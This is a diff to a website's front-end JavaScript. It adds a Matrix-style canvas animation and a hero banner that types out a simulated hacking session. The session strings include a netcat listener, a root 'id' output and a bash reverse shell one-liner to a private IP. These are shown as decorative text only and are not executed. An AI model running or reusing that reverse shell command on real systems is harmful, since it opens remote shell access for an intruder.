@@ -71,7 +71,65 @@
   if(grid) io.observe(grid); else run();
 })();
 
-});
+/* ===== Fondo Matrix (canvas) ===== */
+(function(){
+  const c = document.getElementById('matrix-bg');
+  if(!c) return;
+  const ctx = c.getContext('2d');
+  let w=0,h=0,cols=0,y=[];
+  const glyphs = '$#%&*+<>=-abcdefghijklmnopqrstuvwxyz0123456789'.split('');
+  const CELL = 14, ROW = 16;
+
+  function fit(){
+    const r = c.getBoundingClientRect();
+    const dpr = Math.max(1, window.devicePixelRatio || 1);
+    c.width  = Math.floor(r.width * dpr);
+    c.height = Math.floor(r.height * dpr);
+    w = c.width; h = c.height;
+    ctx.setTransform(dpr,0,0,dpr,0,0);
+    cols = Math.ceil(r.width / CELL);
+    y = new Array(cols).fill(0);
+  }
+  function tick(){
+    ctx.fillStyle = 'rgba(0,0,0,0.09)'; ctx.fillRect(0,0,w,h);
+    ctx.fillStyle = '#ff2a55';
+    ctx.font = '14px monospace';
+    for(let i=0;i<cols;i++){
+      const text = glyphs[(Math.random()*glyphs.length)|0];
+      ctx.fillText(text, i*CELL, y[i]*ROW);
+      if(y[i]*ROW > h && Math.random() > 0.975) y[i] = 0;
+      else y[i]++;
+    }
+    raf = requestAnimationFrame(tick);
+  }
+  let raf; fit(); tick();
+  addEventListener('resize', fit, {passive:true});
+  if (matchMedia('(prefers-reduced-motion: reduce)').matches){
+    cancelAnimationFrame(raf); ctx.clearRect(0,0,w,h);
+  }
+})();
+
+/* ===== Hero: reverse shell + id(root) ===== */
+(function(){
+  const A = document.querySelector('[data-ty="a"]');
+  const B = document.querySelector('[data-ty="b"]');
+  if(!A || !B) return;
+  const a = [
+    "ncat -lvnp 4444",
+    "listening on [any] 4444 ...",
+    "connection received from 10.10.10.42",
+    "id",
+    "uid=0(root) gid=0(root) groups=0(root)"
+  ];
+  const b = [ "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" ];
+
+  function type(el, s, d){
+    return new Promise(res=>{
+      let i=0;(function step(){
+        if(i<s.length){ el.textContent += s.charAt(i++); setTimeout(step,d); }
+        else{ el.textContent += "\n"; res(); }
+      })();
+    });
   }
   async function run(){
     A.textContent=""; B.textContent="";
@@ -89,11 +147,13 @@
 /* MATRIX_GUTTERS_V1 */
 (function(){
   function Matrix(canvas){
+    if(!canvas) return;
     this.c = canvas; this.ctx = canvas.getContext('2d');
     this.dpr = Math.max(1, window.devicePixelRatio || 1);
     this.w=this.h=this.cols=0; this.drops=[]; this.speed=[];
   }
   Matrix.prototype.fit = function(){
+    if(!this.c) return;
     const r = this.c.getBoundingClientRect();
     this.c.width  = Math.max(1, Math.floor(r.width * this.dpr));
     this.c.height = Math.max(1, Math.floor(r.height * this.dpr));
@@ -105,6 +165,7 @@
     this.ctx.font = '14px monospace';
   };
   Matrix.prototype.tick = function(){
+    if(!this.c) return;
     const ctx=this.ctx;
     ctx.fillStyle='rgba(0,0,0,.09)'; ctx.fillRect(0,0,this.w,this.h);
     const glyphs='アカサタナハマヤラワ0123456789'.split('');
@@ -119,13 +180,15 @@
       }
     }
   };
-  const L=document.getElementById('matrix-left');
-  const R=document.getElementById('matrix-right');
-  if(!L||!R) return;
-  const A=new Matrix(L), B=new Matrix(R);
-  function fit(){ A.fit(); B.fit(); }
-  function loop(){ A.tick(); B.tick(); raf=requestAnimationFrame(loop); }
-  let raf; if (document.readyState==='loading'){ addEventListener('DOMContentLoaded', ()=>{ fit(); loop(); }); } else { fit(); loop(); }
-  addEventListener('resize', fit, {passive:true});
-  if (matchMedia('(prefers-reduced-motion: reduce)').matches){ cancelAnimationFrame(raf); }
+  function run(){
+    var L=document.getElementById('matrix-left');
+    var R=document.getElementById('matrix-right');
+    if(!L || !R) return;
+    var A=new Matrix(L), B=new Matrix(R);
+    function fit(){ A.fit(); B.fit(); }
+    function loop(){ A.tick(); B.tick(); raf=requestAnimationFrame(loop); }
+    let raf; fit(); loop(); addEventListener('resize', fit, {passive:true});
+    if (matchMedia('(prefers-reduced-motion: reduce)').matches){ cancelAnimationFrame(raf); }
+  }
+  if(document.readyState==='loading'){ document.addEventListener('DOMContentLoaded', run); } else { run(); }
 })();
